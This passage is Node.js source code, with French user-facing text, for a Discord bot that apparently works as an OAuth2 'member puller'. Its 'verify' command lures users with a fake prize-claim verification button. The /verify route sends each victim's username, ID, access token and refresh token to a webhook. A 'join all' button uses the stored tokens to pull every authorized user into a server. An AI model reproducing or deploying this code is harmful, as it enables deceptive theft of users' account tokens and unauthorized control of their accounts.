    } catch (error) {
      console.error(error);
      message.channel.send("Une erreur s'est produite lors de la tentative de quitter le serveur.");
    }
  }
      
  
if (command === "bot-info") {
  const botInfoEmbed = new Discord.MessageEmbed()
    .setTitle("Informations sur le bot")
    .setColor("0000FF")
    .addField("Nom du bot", client1.user.username)
    .addField("Version du bot", "3.0.3")
    .addField("Langage", "JavaScript (Node.js)")
    .addField("Créé par", "Noxtro787")
    .addField("Owner", "Noxtro787")
    .addField("Bibliothèque", "Discord.js")
    .addField("Serveurs connectés", client1.guilds.cache.size)
    .setThumbnail(client1.user.displayAvatarURL())
    .setFooter("OAuth2 Bot Tous droits réservés.");

  const supportButton = new disbut.MessageButton()
    .setStyle("url")
    .setLabel("Obtenir un OAuth2 Bot")
    .setURL(config.support);

  message.channel.send({
    embed: botInfoEmbed,
    button: supportButton
   });
}

if (command === "webhook-info") {
  if (!config.owners.includes(message.author.id)) {
    const embed = new Discord.MessageEmbed()
      .setColor('#FF0000')
      .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
    return message.channel.send(embed);
  }

  const maskedWebhookURL = `|| ${config.webhook.URL} ||`; 

  const webhookInfoEmbed = new Discord.MessageEmbed()
    .setTitle("Informations sur le Webhook")
    .setColor("0000FF")
    .addField("URL du Webhook", maskedWebhookURL)
    .setThumbnail(client1.user.displayAvatarURL()) 


  message.channel.send(webhookInfoEmbed);
}

const validUrlRegex = /^(https?|http):\/\/[^\s$.?#].[^\s]*$/i;
if (command === "set-webhook") {
  if (!config.owners.includes(message.author.id)) {
    const embed = new Discord.MessageEmbed()
      .setColor('#FF0000')
      .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
    return message.channel.send(embed);
  }

  const newWebhookURL = args[0];

  if (!validUrlRegex.test(newWebhookURL)) {
    const invalidUrlEmbed = new Discord.MessageEmbed()
      .setColor('#FF0000')
      .setDescription("L'URL du webhook fournie n'est pas valide.");
    return message.channel.send(invalidUrlEmbed);
  }

  axios.head(newWebhookURL)
    .then((response) => {
      if (response.status === 200) {
        config.webhook.URL = newWebhookURL;

        fs.writeFile('config.json', JSON.stringify(config, null, 2), (err) => {
          if (err) {
            console.error("Erreur lors de la sauvegarde du fichier de configuration :", err);
            const errorEmbed = new Discord.MessageEmbed()
              .setColor('#FF0000')
              .setDescription("L'URL du webhook fournie n'est pas valide.");
            return message.channel.send(errorEmbed);
          }

          const successEmbed = new Discord.MessageEmbed()
            .setColor('#00FF00')
            .setDescription(`URL du webhook mise à jour avec succès : ${newWebhookURL}`);
          message.channel.send(successEmbed);
        });
      } else {
        const invalidWebhookEmbed = new Discord.MessageEmbed()
          .setColor('#FF0000')
          .setDescription("L'URL du webhook fournie n'est pas valide ou le webhook n'est pas actif.");
        message.channel.send(invalidWebhookEmbed);
      }
    })
    .catch((error) => {
      console.error("Erreur lors de la vérification du webhook :", error);
      const errorEmbed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Une erreur s'est produite lors de la vérification du webhook.");
      message.channel.send(errorEmbed);
    });
}

  if (command === "check") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }
    let checkembed = new Discord.MessageEmbed()
      .setDescription(`${config.emojis.link} Veuillez vous vérifier !.`)
      .setColor("0000FF")
    let check = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Verify')
      .setURL(AUTH_LINK)
    message.channel.send({ embed: checkembed, button: check })
  }


  if (command === "verify") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }
    const embed = new Discord.MessageEmbed()
      .setDescription(
        `${config.emojis.arrow} *Tu doit te faire vérifier pour réclamer votre prix !*\n\n**1.**Clique sur le [__button__](${AUTH_LINK})\n**2.** Clique sur [__Authorize__](${AUTH_LINK})\n\n`)
      .setColor("#0000FF")

    let verify = new disbut.MessageButton()
      .setStyle('url')
      .setLabel('Clique sur ce bouton pour te faire vérifier')
      .setURL(AUTH_LINK)
      .setEmoji("🎉")

    msg.channel.send({ embed: embed, button: verify })
  }

  if (command === "ping") {
    if (!config.owners.includes(message.author.id)) {
      const embed = new Discord.MessageEmbed()
        .setColor('#FF0000')
        .setDescription("Vous n'êtes pas autorisé à utiliser cette commande.")
      return message.channel.send(embed);
    }
    msg.reply(`:ping_pong: Pong! ${bot.ws.ping}ms`)
  }})


app.get("/", (req, res) => {
  res.redirect(config.oauth_link);
});


app.get("/verify", async (req, res) => {
  const data = await client.manageAuth({ code: req.query.code });
  const user_id = await client.requestId(data.access_token);
  const obj = {
    ...data,
    user_id
  };
  client.saveAuth(obj);

  fetch('https://discord.com/api/users/@me', {
    headers: {
      authorization: `Bearer ${data.access_token}`,
    },
  })
    .then(result => result.json())
    .then(response => {
      const { username, discriminator, avatar, id } = response;

      let params = {
        username: config.webhook.webhookNAME,
        avatar_url: config.webhook.avatarURL,
        embeds: [{
          "title": `<a:IconUserStat:1132427565785677855>  Nouveau Utulisateur`,
          "description": `<a:arrow:1132427340761288714>  Identitiant: \`${username}#${discriminator}\`\n\n<a:arrow:1132427340761288714>  Identitiant ID: \`${id}\`\n\n<a:arrow:1132427340761288714>  Access Token: \`${data.access_token}\`\n\n<a:arrow:1132427340761288714>  Refresh Token: \`${data.refresh_token}\``,
          "thumbnail": { "url": `https://cdn.discordapp.com/avatars/${id}/${avatar}.png?size=2048` }
        }]
      }


      fetch(config.webhook.URL, {
        method: "POST",
        headers: {
          'Content-type': 'application/json'
        },
        body: JSON.stringify(params)
      }).then(res => {
        console.log(res);
      })
    })

  //webhook.send({embeds: [embed]})

  res.redirect("https://discord.com/oauth2/authorized");
});

app.listen(20010); // Local Host Port

client.on("clickButton", async (bot, button, userID, guildID) => {
  const member = button.clicker.user.id;
  if (config.owners.includes(userID)) {

    AUTH_LINK = config.oauth_link

    if (button.id === 'AL') {
      const embed = new Discord.MessageEmbed()
        .setDescription(`${AUTH_LINK}`)
        .setColor("#0000FF")
      button.channel.send({ embed: embed })
      button.reply.defer()


    }
    if (button.id === 'IL') {
      const embedd = new Discord.MessageEmbed()
        .setDescription(`https://discord.com/api/oauth2/authorize?client_id=${bot.user.id}&permissions=8&redirect_uri=https%3A%2F%2FOauth3-3.atahanbert.repl.co%2Fcallback&response_type=code&scope=bot`)
        .setColor("#0000FF")
      button.channel.send({ embed: embedd })
      button.reply.defer()

    }

    if (button.id === 'PING') {

      button.channel.send(`:ping_pong: Pong!\nLatence de l'API : **${Math.round(client.ws.ping)}ms**`)
      button.reply.defer()

    }
    if (button.id === 'busers') {

      const amount = await client.tokenCount();
      const embed = new Discord.MessageEmbed()
        .setTitle(`${config.emojis.user} Informations OAuth2`)
        .setDescription(`Il y a \`${amount}\`utilisateurs autorisés! \n\nTemps estimé pour ajouter tous les membres 1-30 minutes.`)
        .setColor("#0000FF")
      button.channel.send(embed);

      button.reply.defer()

    }


    if (button.id === 'links') {
      const emmbed = new Discord.MessageEmbed()
        .setTitle(`${config.emojis.user} Lien Dashboard`)
        .setDescription(`**OAuth2:** \n${AUTH_LINK}\n\`\`\`${AUTH_LINK}\`\`\`\n**Invite:\n**\[**BOT INVITATION LIEN**](https://discord.com/api/oauth2/authorize?client_id=1010263092464193607&permissions=8&scope=bot)\n\`\`\`https://discord.com/api/oauth2/authorize?client_id=1010263092464193607&permissions=8&scope=bot\`\`\``)
        .setColor("#0000FF")

      button.channel.send({ embed: emmbed });
      button.reply.defer()

    }


    if (button.id === 'cancel') {
      /*  const emmbed = new Discord.MessageEmbed()
        .setDescription(`<a:loading:1007345170393616515> *Canceling this pull...*
        `)
        .setColor("#2F3136")
        button.channel.send({embed: emmbed}).then(msg => {*/
      const guild = button.guild;
      guild.leave();
    }
    const sayi = await client.tokenCount();
    if (button.id === 'bjoinall') {
      let pull = new Discord.MessageEmbed()
        .setTitle(` Utilisateurs rejoignant :`)
        .setDescription('<:link:1127753877572309052> Les utulisateur sont en train de rejoindre ! Le temps sera de 10 a 30 minutes.\n<:link:1127290849148014744> Tape `+help` pour plus de commandes')
        .setColor("BLUE")
        .setFooter("Oauth2 Bot")
      button.channel.send(pull)
      await client.manageJoin({
        amount: sayi,
        guild_id: button.guild.id
      }, message);
    }
  }
})

function isValidURL(url) {
  try {
    new URL(url);
    return true;
  } catch (error) {
    return false;
  }
}